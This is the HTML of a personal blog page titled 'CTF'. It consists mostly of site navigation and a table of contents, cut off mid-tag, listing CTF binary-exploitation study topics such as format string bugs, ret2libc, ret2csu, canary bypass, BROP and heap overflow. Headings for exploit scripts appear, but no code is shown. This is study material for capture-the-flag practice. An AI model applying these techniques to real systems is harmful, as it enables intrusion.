<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>CTF | Rayii&#39;s blog</title>
  <meta name="keywords" content="">
  <meta name="description" content="CTF | Rayii&#39;s blog">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta property="og:type" content="website">
<meta property="og:title" content="about">
<meta property="og:url" content="https://1xueyu1.github.io/about/index.html">
<meta property="og:site_name" content="Rayii&#39;s blog">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2018-09-30T09:25:30.000Z">
<meta property="article:modified_time" content="2023-11-19T16:26:31.768Z">
<meta property="article:author" content="Rayii">
<meta name="twitter:card" content="summary">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.1.0" rel="stylesheet">

<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">

<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">

<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="/js/titleTip.js?v=1.1.0" ></script>

<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>



<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>

<script src="/js/iconfont.js?v=1.1.0" ></script>

<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Rayii's blog" type="application/atom+xml">
</head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="">
  <input class="theme_blog_path" value="">
  <input id="theme_shortcut" value="true" />
  <input id="theme_highlight_on" value="true" />
  <input id="theme_code_copy" value="true" />
</div>



<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/"
   class="avatar_target">
    <img class="avatar"
         src="/img/avatar.jpg"/>
</a>
<div class="author">
    <span>Rayii</span>
</div>

<div class="icon">
    
        
    
        
            <a title="github"
               href="https://github.com/1xueyu1"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-github"></use>
                    </svg>
                
            </a>
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            <a title="email"
               href="mailto:3299391667@qq.com"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-email"></use>
                    </svg>
                
            </a>
        
    
        
            <a title="qq"
               href="http://wpa.qq.com/msgrd?v=3&uin=3299391667&site=qq&menu=yes"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-qq"></use>
                    </svg>
                
            </a>
        
    
        
            <a title="kugou"
               href="https://www.kugou.com/"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-kugou"></use>
                    </svg>
                
            </a>
        
    
        
    
</div>





<ul>
    <li>
        <div class="all active" data-rel="All">All
            
                <small>(28)</small>
            
        </div>
    </li>
    
        
            
                
    <li>
        <div data-rel="工具">
            
            工具
            <small>(4)</small>
        </div>
        
    </li>

            
        
    
        
            
                
    <li>
        <div data-rel="逆向">
            
            逆向
            <small>(1)</small>
        </div>
        
    </li>

            
        
    
        
            
        
    
        
            
        
    
        
            
                
    <li>
        <div data-rel="数据结构">
            <i class="fold iconfont icon-right"></i>
            数据结构
            <small>(14)</small>
        </div>
        
            <ul class="sub hide">
                
                    
    <li>
        <div data-rel="数据结构&lt;---&gt;树">
            
            树
            <small>(5)</small>
        </div>
        
    </li>

                
                    
    <li>
        <div data-rel="数据结构&lt;---&gt;图">
            
            图
            <small>(5)</small>
        </div>
        
    </li>

                
                    
    <li>
        <div data-rel="数据结构&lt;---&gt;skill">
            
            skill
            <small>(3)</small>
        </div>
        
    </li>

                
            </ul>
        
    </li>

            
        
    
        
            
                
    <li>
        <div data-rel="体系结构">
            <i class="fold iconfont icon-right"></i>
            体系结构
            <small>(1)</small>
        </div>
        
            <ul class="sub hide">
                
                    
    <li>
        <div data-rel="体系结构&lt;---&gt;CSAPP">
            
            CSAPP
            <small>(1)</small>
        </div>
        
    </li>

                
            </ul>
        
    </li>

            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
                
    <li>
        <div data-rel="CTF">
            
            CTF
            <small>(1)</small>
        </div>
        
    </li>

            
        
    
        
            
                
    <li>
        <div data-rel="MySQL">
            
            MySQL
            <small>(1)</small>
        </div>
        
    </li>

            
        
    
        
            
                
    <li>
        <div data-rel="pwn_college">
            
            pwn_college
            <small>(1)</small>
        </div>
        
    </li>

            
        
    
        
            
                
    <li>
        <div data-rel="python">
            <i class="fold iconfont icon-right"></i>
            python
            <small>(4)</small>
        </div>
        
            <ul class="sub hide">
                
                    
    <li>
        <div data-rel="python&lt;---&gt;爬虫">
            
            爬虫
            <small>(3)</small>
        </div>
        
    </li>

                
                    
    <li>
        <div data-rel="python&lt;---&gt;正则表达式">
            
            正则表达式
            <small>(1)</small>
        </div>
        
    </li>

                
            </ul>
        
    </li>

            
        
    
        
            
        
    
        
            
                
    <li>
        <div data-rel="web">
            
            web
            <small>(1)</small>
        </div>
        
    </li>

            
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
        
            
            
            
    </div>
    <div>
        
            <a class="about  hasFriend  site_url"
               
               href="/about">About</a>
        
        <a style="width: 50%"
                
                                           class="friends">Friends</a>
        
    </div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="28">

<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        Links
        <i class="iconfont icon-left"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <div class="right-top">
        <div id="default-panel">
            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
            <div class="right-title">All</div>
            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
        </div>
        <div id="search-panel">
            <i class="iconfont icon-left" data-title="返回"></i>
            <input id="local-search-input" autocomplete="off"/>
            <label class="border-line" for="input"></label>
            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
            <i class="iconfont icon-tag" data-title="标签"></i>
        </div>
        <div id="outline-panel" style="display: none">
            <div class="right-title">大纲</div>
            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
        </div>
    </div>

    <div class="tags-list">
    <input id="tag-search" />
    <div class="tag-wrapper">
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>并查集</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>差分数组</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>单调栈</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>递归</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>二叉树</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>二叉树的遍历</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>二分法</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>记忆化搜索</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>逆向</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>排序</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>拓扑排序</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>图</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>线段树</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>最短路径</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>最小生成树</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>AVL树</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>C</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Git</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Markdown</a>
            </li>
        
    </div>

</div>

    
    <nav id="title-list-nav">
        
        
        <a  class="All MySQL "
           href="/2024/07/23/MySQL/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="MySQL">MySQL</span>
            <span class="post-date" title="2024-07-23 12:03:27">2024/07/23</span>
        </a>
        
        
        <a  class="All web "
           href="/2024/07/17/web%E5%BC%80%E5%8F%91/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="web开发">web开发</span>
            <span class="post-date" title="2024-07-17 15:16:05">2024/07/17</span>
        </a>
        
        
        <a  class="All CTF "
           href="/2024/03/15/CTF/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF">CTF</span>
            <span class="post-date" title="2024-03-15 21:34:12">2024/03/15</span>
        </a>
        
        
        <a  class="All 数据结构 树 "
           href="/2024/02/22/N%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="N叉树的遍历">N叉树的遍历</span>
            <span class="post-date" title="2024-02-22 16:08:17">2024/02/22</span>
        </a>
        
        
        <a  class="All 工具 "
           href="/2024/02/19/tmux/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="tmux-tutorial">tmux-tutorial</span>
            <span class="post-date" title="2024-02-19 20:36:09">2024/02/19</span>
        </a>
        
        
        <a  class="All 工具 "
           href="/2024/02/19/GDB/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="GDB-tutorial">GDB-tutorial</span>
            <span class="post-date" title="2024-02-19 17:10:41">2024/02/19</span>
        </a>
        
        
        <a  class="All 体系结构 CSAPP "
           href="/2024/02/17/CSAPP/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CSAPP-Lab">CSAPP-Lab</span>
            <span class="post-date" title="2024-02-17 22:17:36">2024/02/17</span>
        </a>
        
        
        <a  class="All 工具 "
           href="/2024/02/16/Git-learning/"
           data-tag="Git"
           data-author="" >
            <span class="post-title" title="Git-tutorial">Git-tutorial</span>
            <span class="post-date" title="2024-02-16 16:39:01">2024/02/16</span>
        </a>
        
        
        <a  class="All python 爬虫 "
           href="/2024/02/07/%E5%A4%9A%E8%BF%9B%E7%A8%8B/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="多进程">多进程</span>
            <span class="post-date" title="2024-02-07 21:24:29">2024/02/07</span>
        </a>
        
        
        <a  class="All python 爬虫 "
           href="/2024/02/07/bs4%E8%A7%A3%E6%9E%90/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="bs4解析">bs4解析</span>
            <span class="post-date" title="2024-02-07 20:34:01">2024/02/07</span>
        </a>
        
        
        <a  class="All python 正则表达式 "
           href="/2024/02/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="正则表达式">正则表达式</span>
            <span class="post-date" title="2024-02-07 17:45:37">2024/02/07</span>
        </a>
        
        
        <a  class="All python 爬虫 "
           href="/2024/01/27/%E7%88%AC%E8%99%AB/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="爬虫入门">爬虫入门</span>
            <span class="post-date" title="2024-01-27 20:59:48">2024/01/27</span>
        </a>
        
        
        <a  class="All pwn_college "
           href="/2024/01/17/pwn-college/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="pwn_college">pwn_college</span>
            <span class="post-date" title="2024-01-17 22:22:05">2024/01/17</span>
        </a>
        
        
        <a  class="All 数据结构 skill "
           href="/2023/12/21/%E5%8D%95%E8%B0%83%E6%A0%88/"
           data-tag="单调栈"
           data-author="" >
            <span class="post-title" title="单调栈">单调栈</span>
            <span class="post-date" title="2023-12-21 18:19:00">2023/12/21</span>
        </a>
        
        
        <a  class="All 数据结构 "
           href="/2023/12/20/%E6%8E%92%E5%BA%8F/"
           data-tag="排序"
           data-author="" >
            <span class="post-title" title="排序">排序</span>
            <span class="post-date" title="2023-12-20 11:41:56">2023/12/20</span>
        </a>
        
        
        <a  class="All 数据结构 skill "
           href="/2023/12/17/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84/"
           data-tag="差分数组"
           data-author="" >
            <span class="post-title" title="差分数组">差分数组</span>
            <span class="post-date" title="2023-12-17 19:33:22">2023/12/17</span>
        </a>
        
        
        <a  class="All 数据结构 树 "
           href="/2023/12/12/AVL%E6%A0%91/"
           data-tag="AVL树"
           data-author="" >
            <span class="post-title" title="AVL树">AVL树</span>
            <span class="post-date" title="2023-12-12 19:54:33">2023/12/12</span>
        </a>
        
        
        <a  class="All 数据结构 图 "
           href="/2023/12/03/%E8%AE%B0%E5%BF%86%E5%8C%96%E9%80%92%E5%BD%92/"
           data-tag="递归,记忆化搜索"
           data-author="" >
            <span class="post-title" title="记忆化递归">记忆化递归</span>
            <span class="post-date" title="2023-12-03 12:46:16">2023/12/03</span>
        </a>
        
        
        <a  class="All 数据结构 图 "
           href="/2023/11/30/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"
           data-tag="最短路径"
           data-author="" >
            <span class="post-title" title="最短路径">最短路径</span>
            <span class="post-date" title="2023-11-30 19:13:30">2023/11/30</span>
        </a>
        
        
        <a  class="All 数据结构 树 "
           href="/2023/11/27/%E4%BA%8C%E5%8F%89%E6%A0%91%E8%BF%AD%E4%BB%A3%E5%99%A8/"
           data-tag="二叉树"
           data-author="" >
            <span class="post-title" title="二叉树迭代器">二叉树迭代器</span>
            <span class="post-date" title="2023-11-27 22:36:10">2023/11/27</span>
        </a>
        
        
        <a  class="All 数据结构 图 "
           href="/2023/11/27/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/"
           data-tag="最小生成树"
           data-author="" >
            <span class="post-title" title="最小生成树">最小生成树</span>
            <span class="post-date" title="2023-11-27 10:22:26">2023/11/27</span>
        </a>
        
        
        <a  class="All 数据结构 树 "
           href="/2023/11/26/%E7%BA%BF%E6%AE%B5%E6%A0%91/"
           data-tag="线段树"
           data-author="" >
            <span class="post-title" title="线段树">线段树</span>
            <span class="post-date" title="2023-11-26 10:37:35">2023/11/26</span>
        </a>
        
        
        <a  class="All 逆向 "
           href="/2023/11/24/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/"
           data-tag="逆向"
           data-author="" >
            <span class="post-title" title="逆向基础">逆向基础</span>
            <span class="post-date" title="2023-11-24 22:30:50">2023/11/24</span>
        </a>
        
        
        <a  class="All 数据结构 skill "
           href="/2023/11/23/%E4%BA%8C%E5%88%86%E6%B3%95/"
           data-tag="二分法"
           data-author="" >
            <span class="post-title" title="二分法">二分法</span>
            <span class="post-date" title="2023-11-23 21:04:24">2023/11/23</span>
        </a>
        
        
        <a  class="All 数据结构 图 "
           href="/2023/11/21/%E5%B9%B6%E6%9F%A5%E9%9B%86/"
           data-tag="并查集"
           data-author="" >
            <span class="post-title" title="并查集">并查集</span>
            <span class="post-date" title="2023-11-21 23:04:53">2023/11/21</span>
        </a>
        
        
        <a  class="All 数据结构 图 "
           href="/2023/11/21/%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F/"
           data-tag="图,拓扑排序"
           data-author="" >
            <span class="post-title" title="拓扑排序">拓扑排序</span>
            <span class="post-date" title="2023-11-21 00:11:36">2023/11/21</span>
        </a>
        
        
        <a  class="All 数据结构 树 "
           href="/2023/11/20/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/"
           data-tag="二叉树的遍历,C"
           data-author="" >
            <span class="post-title" title="二叉树的遍历">二叉树的遍历</span>
            <span class="post-date" title="2023-11-20 17:09:30">2023/11/20</span>
        </a>
        
        
        <a  class="All 工具 "
           href="/2023/11/19/markdown-tutorial/"
           data-tag="Markdown"
           data-author="" >
            <span class="post-title" title="markdown-tutorial">markdown-tutorial</span>
            <span class="post-date" title="2023-11-19 00:51:12">2023/11/19</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>

    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="切换全屏 快捷键 s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-CTF" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">CTF</h1>
    
    <div class="article-meta">
        
        
        
        <span class="book">
            <i class="iconfont icon-category"></i>
            
            
            <a  data-rel="CTF">CTF</a>
            
        </span>
        
        
    </div>
    <div class="article-meta">
        
            Created At : <time class="date" title='Updated At: 2024-05-26 23:30:27'>2024-03-15 21:34</time>
        
    </div>
    <div class="article-meta">
        
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-IDA%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C"><span class="toc-text">1.IDA基础操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">二进制基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-text">函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BD%AC%E6%8D%A2%E6%8C%87%E7%A4%BA%E7%AC%A6"><span class="toc-text">转换指示符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6"><span class="toc-text">长度</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E5%B1%9E%E6%80%A7"><span class="toc-text">二进制安全属性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#symbol"><span class="toc-text">symbol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#canary"><span class="toc-text">canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PIE"><span class="toc-text">PIE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81NX"><span class="toc-text">4、NX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81RELRO%EF%BC%88GOT-%E5%86%99%E4%BF%9D%E6%8A%A4%EF%BC%89"><span class="toc-text">5、RELRO（GOT 写保护）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E5%AF%B9%E9%BD%90"><span class="toc-text">栈对齐</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-text">ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90shell%E4%BB%A3%E7%A0%81"><span class="toc-text">生成shell代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%AD%E5%AD%97%E8%8A%82shellcode"><span class="toc-text">短字节shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode"><span class="toc-text">可见字符shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-alpha3-master"><span class="toc-text">使用 alpha3-master</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#x64"><span class="toc-text">x64</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#x32"><span class="toc-text">x32</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2syscall"><span class="toc-text">ret2syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#32%E4%BD%8D%E7%A8%8B%E5%BA%8F"><span class="toc-text">32位程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#64%E4%BD%8D%E7%A8%8B%E5%BA%8F"><span class="toc-text">64位程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-text">系统调用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#e-g"><span class="toc-text">e.g.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-text">工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PLT-GOT"><span class="toc-text">PLT&amp;GOT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#system-0-%E5%87%BD%E6%95%B0"><span class="toc-text">system($0)函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc"><span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#e-g-2021-%E9%B9%A4%E5%9F%8E%E6%9D%AF-babyof-NSSCTF"><span class="toc-text">e.g.[2021 鹤城杯]babyof | NSSCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2021-%E9%B9%A4%E5%9F%8E%E6%9D%AFCanary-littleof"><span class="toc-text">[2021 鹤城杯Canary]littleof</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Canary%E7%BB%95%E8%BF%87"><span class="toc-text">Canary绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2csu"><span class="toc-text">ret2csu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-1"><span class="toc-text">格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E7%9A%84%E5%86%85%E5%AD%98"><span class="toc-text">泄露任意地址的内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E6%A0%88%E5%86%85%E5%AD%98"><span class="toc-text">覆盖栈内存</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%B0%8F%E6%95%B0%E5%AD%97"><span class="toc-text">覆盖小数字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%A4%A7%E6%95%B0%E5%AD%97"><span class="toc-text">覆盖大数字</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x64%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">x64格式化字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-text">例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwntools-pwnlib-fmtstr-%E6%A8%A1%E5%9D%97"><span class="toc-text">pwntools pwnlib.fmtstr 模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-text">整数溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E7%AC%A6%E5%8F%B7%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-text">有符号整数溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BROP"><span class="toc-text">BROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0"><span class="toc-text">题目复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-text">找到栈溢出漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stop-gadget"><span class="toc-text">stop gadget</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#canary%E7%BB%95%E8%BF%87"><span class="toc-text">canary绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E8%A6%86%E7%9B%96%E6%88%AA%E6%96%AD%E5%AD%97%E7%AC%A6%E8%8E%B7%E5%8F%96Canary"><span class="toc-text">方法一 覆盖截断字符获取Canary</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-1"><span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96Canary"><span class="toc-text">方法二 利用格式化字符串漏洞获取Canary</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-3"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89-%E9%80%90%E5%AD%97%E8%8A%82%E7%88%86%E7%A0%B4"><span class="toc-text">方法三 逐字节爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#e-g-1"><span class="toc-text">e.g.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-4"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81-stack-chk-fail%E5%87%BD%E6%95%B0"><span class="toc-text">劫持__stack_chk_fail函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-5"><span class="toc-text">原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-random%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%AF%87"><span class="toc-text">pwn random伪随机数篇</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#glibc"><span class="toc-text">glibc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#random"><span class="toc-text">random</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90PWN-%C2%B7-%E6%80%BB%E7%BB%93%E3%80%91"><span class="toc-text">【PWN · 总结】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#call-system%E4%B8%8Esystem%E8%B0%83%E7%94%A8"><span class="toc-text">call _system与system调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">利用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E5%86%99fini-array"><span class="toc-text">重写fini_array</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E6%BA%A2%E5%87%BA"><span class="toc-text">堆溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 